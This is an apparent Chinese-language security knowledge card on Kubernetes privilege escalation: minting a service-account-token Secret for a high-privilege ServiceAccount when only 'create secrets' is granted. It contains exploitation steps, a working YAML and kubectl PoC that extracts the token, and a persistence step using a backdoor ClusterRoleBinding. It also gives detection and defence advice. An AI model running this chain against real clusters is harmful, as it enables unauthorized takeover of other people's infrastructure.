---
id: cloud-k8s-create-sa-token-secret-privesc
title: 有 create secrets 权限时为任意高权限 ServiceAccount 铸造 service-account-token Secret 提权
type: scenario
domain: cloud
path: cloud/k8s
technique: k8s-create-service-account-token-secret-privesc
aliases:
- service-account-token Secret 铸造
- kubernetes.io/service-account.name 注解
- clusterrole-aggregation-controller escalate
- create secrets 提权
- 为其他 SA 创建 token
tags:
- kubernetes
- rbac
- secret
- serviceaccount
- token
- privilege-escalation
- escalate
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: Kubernetes v1.22 前自动创建长期不过期的 service-account-token Secret；v1.22+ 推荐 TokenRequest 获取短期自动轮换令牌；原文研究环境 v1.26.1 中手工创建 kubernetes.io/service-account-token Secret 仍成功返回该 SA 的 token
verification:
  verified_by: verifier-V644
  verified_at: '2026-11-13T03:36:23+08:00'
  notes: 已对照原文核对：原文版本分水岭明确写“在k8sv1.22之前，这些ServiceAccount token secrets 是自动创建的，并且寿命很长，不会过期；在k8s v1.22及更高版本中，推荐的方法是使用TokenRequest API”，与卡片 affected_versions 一致；正文“v1.24 起不再自动创建”为通用事实、非原文所述但正确。原文在 v1.26.1 研究环境用 create-sa-token.yaml 为 clusterrole-aggregation-controller 创建 secret 成功（secret/clusterrole-aggregation-controller created），随后 auth can-i 显示 clusterroles.rbac.authorization.k8s.io [escalate get list patch update watch]，支撑本卡 escalate 提权结论。原文 YAML 有笔误（注解写作 k8s.io/service-account.name、type 写作 k8s.io/service-account-token），卡片正确使用 kubernetes.io/service-account.name 注解与 kubernetes.io/service-account-token 类型；已把 alias 中沿用原文笔误的 k8s.io/service-account.name 修正为 kubernetes.io/service-account.name。dedup top 候选为 get/list 读 Secret、bind ClusterRoleBinding、TokenRequest 等不同 verb/sink，非同链。未验证点：未在真实K8s环境复跑；frontmatter 无 sources/source_url。
---

# 一句话结论

当当前 ServiceAccount 拥有某命名空间的 `create` secrets 权限时，可以创建一个 `type: kubernetes.io/service-account-token`、注解 `kubernetes.io/service-account.name: <目标SA>` 的 Secret，token 控制器会自动把目标 SA 的有效 token 填进 `data.token`；攻击者随即读取该 Secret 并以目标 SA 身份调用 apiserver——若目标选为拥有 `escalate` 的 `clusterrole-aggregation-controller` 或拥有集群管理权限的 `argocd-application-controller`，即可完成集群提权。

# 原理

- **legacy token Secret 机制**：`kubernetes.io/service-account-token` 类型的 Secret 是 K8s 传统上为 SA 提供长期凭据的方式。Secret 上带 `kubernetes.io/service-account.name` 注解时，token controller 会为其关联的 ServiceAccount 生成 token（以及 `ca.crt`），写入 Secret 的 `data.token`。
- **授权检查不到目标身份**：创建 Secret 只需要 `create secrets` 权限，并不需要对该 ServiceAccount 有任何权限；目标 SA 的名字写在注解里由控制器解析。因此“能创建 Secret”等价于“能为该命名空间内任意 SA 铸造凭据”。
- **token 继承目标 SA 的全部权限**：用铸出的 token 调用 apiserver 时，RBAC 看到的是目标 SA 绑定的 Role/ClusterRole。若目标 SA 是高权限组件（Argo-CD application controller 为 cluster-admin，clusterrole-aggregation-controller 带 `escalate`），攻击者即取得对应权限。
- **escalate 动词的意义**：RBAC 默认阻止创建/更新比自身权限更大的 Role/ClusterRole；`escalate` 是这个限制的官方例外，持有者可以创建/更新任意 Role/ClusterRole。`clusterrole-aggregation-controller` 负责聚合 ClusterRole，天然需要 escalate，因此拿到它的 token 就能把高权限规则聚合进角色或直接造出全权角色。
- **版本背景**：v1.22 及更早会自动创建长期不过期的 SA token Secret；v1.22+ 官方推荐 TokenRequest 短期令牌，v1.24 起不再自动创建。但手工创建的 `kubernetes.io/service-account-token` Secret 仍由 token controller 填充（原文在 v1.26.1 环境实测成功），所以该手法在新集群上依然可用。
- **为什么成立**：这是三个既有设计叠加的结果——普通的 Secret 创建权限、按注解为任意 SA 签发 token 的控制器、以及 RBAC 不校验 Secret 创建者对目标 SA 的关系。

# 触发条件

- 当前 SA 在目标命名空间拥有 `create` secrets 权限（该命名空间内存在高权限 SA；在 kube-system 中价值最高）。
- apiserver 可达，当前 token 有效；集群未通过准入策略禁止该类型 Secret。
- 目标 SA（如 `clusterrole-aggregation-controller`、`argocd-application-controller`）存在于同一命名空间。
- 攻击者还能读取自己创建的 Secret（创建者通常可 get，或另有 get/list secrets 权限）。

# 利用步骤

1. 枚举当前权限，确认 `create secrets`（`kubectl auth can-i create secrets -n kube-system`）。
2. 枚举目标命名空间内的高权限 SA，重点看集群管理组件：`kubectl get sa -n kube-system`、`kubectl get clusterrolebinding -o wide`。
3. 创建引用目标 SA 的 token Secret（见 PoC）；等待 token controller 填充 `data.token`。
4. 读取 Secret，base64 解码 `token` 字段。
5. 用新 token 执行 `kubectl --token=<token> auth can-i --list` 验证权限；对 `clusterrole-aggregation-controller` 可进一步创建/更新 ClusterRole 聚合 `cluster-admin`，或直接绑定。
6. 持久化：保留该 Secret 或创建后门 SA/ClusterRoleBinding。

# PoC

```yaml
# create-sa-token.yaml
apiVersion: v1
kind: Secret
metadata:
  name: research-argo-token
  namespace: kube-system
  annotations:
    kubernetes.io/service-account.name: "argocd-application-controller"
type: kubernetes.io/service-account-token
```

```bash
kubectl --server=https://<apiserver>:6443 --certificate-authority=ca.crt \
  --token=$(cat current.token) -n kube-system create -f create-sa-token.yaml

kubectl --server=https://<apiserver>:6443 --certificate-authority=ca.crt \
  --token=$(cat current.token) -n kube-system get secret research-argo-token -o yaml \
  | grep 'token:' | grep -v k8s | awk '{print $2}' | base64 -d > new.token

kubectl --token=$(cat new.token) auth can-i --list
```

# 变体与关联

- 若已有 `get/list secrets` 权限，可直接读取现成的 `kubernetes.io/service-account-token` Secret，无需创建：[[cloud-k8s-k8s-rbac-secret-read]]。
- 有 `serviceaccounts/token` 的 create 权限时可用 TokenRequest 直接申请高权限 SA 令牌：[[cloud-k8s-workload-compromise-identity-expansion-privileged-pod]]。
- 有 `create pods` 权限时，也可创建挂载高权限 SA 的 Pod 取 token：[[cloud-k8s-node-sa-token-harvest-rbac-combination-takeover]]。
- escalate 动词滥用与 clusterrole-aggregation-controller 角色见 [[cloud-k8s-k8s-rbac-clusterrolebinding-privesc]]（bind 路径不同）。

# 检测与防御

- 检测：审计日志中 `create` Secret 且对象 `type=kubernetes.io/service-account-token` 或带 `kubernetes.io/service-account.name` 注解；重点关注在 kube-system 中为 controller 类 SA 创建 token Secret。
- 检测：短期窗口内“创建 token Secret → 读取 Secret → 以新 SA 身份调用 auth 接口/敏感 API”的连续行为；`escalate`、ClusterRole 更新事件。
- 防御：RBAC 最小权限，`create secrets` 不轻易授予业务 SA，能用 `resourceNames` 限制就限制；高权限 SA 不与普通工作负载同命名空间；使用准入策略拒绝手工创建的 legacy SA token Secret（或限制注解）、迁移到 bound token/TokenRequest；审计 escalate/bind 等高风险 verb。
